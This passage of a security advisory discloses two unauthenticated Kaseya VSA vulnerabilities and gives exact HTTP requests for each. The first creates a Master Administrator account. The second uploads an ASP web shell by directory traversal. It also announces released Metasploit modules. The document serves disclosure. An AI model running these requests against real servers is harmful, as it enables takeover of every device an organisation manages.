From its console you can control thousands of computers and mobile
devices. So that if you own the Kaseya server, you own the organisation.
With this post I'm also releasing two Metasploit modules ([E1], [E2])
and a Ruby file ([E3]) that exploit the vulnerabilities described below.
 
A special thanks to ZDI for assisting with the disclosure of these
vulnerabilities. The full advisory text is below, but can also be
obtained from my repo at [E4].

>> Technical details:
#1
Vulnerability: Remote privilege escalation (add Master Administrator
account - unauthenticated)
CVE-2015-6922 / ZDI-15-448
Affected versions:
VSA Version 7.0.0.0 â?? 7.0.0.32
VSA Version 8.0.0.0 â?? 8.0.0.22
VSA Version 9.0.0.0 â?? 9.0.0.18
VSA Version 9.1.0.0 â?? 9.1.0.8
 
GET /LocalAuth/setAccount.aspx
Page will attempt to redirect, ignore this and obtain the "sessionVal"
value from the page which will be used in the following POST request.
 
POST /LocalAuth/setAccount.aspx
sessionVal=<sessionVal>&adminName=<username>&NewPassword=<password>&conf
irm=<password>&adminEmail=bla (at) bla (dot) com [email concealed]&setAccount=Create
 
You are now a Master Administrator and can execute code in all the
managed desktops and mobile devices.
A Metasploit module that exploits this vulnerability has been released.
 
#2
Vulnerability: Remote code execution via file upload with directory
traversal (unauthenticated)
CVE-2015-6922 / ZDI-15-449
Affected versions:
VSA Version 7.0.0.0 â?? 7.0.0.32
VSA Version 8.0.0.0 â?? 8.0.0.22
VSA Version 9.0.0.0 â?? 9.0.0.18
VSA Version 9.1.0.0 â?? 9.1.0.8
 
First we do:
GET /ConfigTab/serverfiles.asp
which will respond with a 302 redirect to /mainLogon.asp?logout=<sessionID>
Thanks for creating a valid sessionID for us, Kaseya!
 
POST
/ConfigTab/uploader.aspx?PathData=C%3A%5CKaseya%5CWebPages%5C&qqfile=she
ll.asp
Cookie: sessionId=<sessionID>
<... ASP shell here...>
 
The path needs to be correct, but Kaseya is helpful enough to let us
know when a path doesn't exist.
A Metasploit module that exploits this vulnerability has been released.
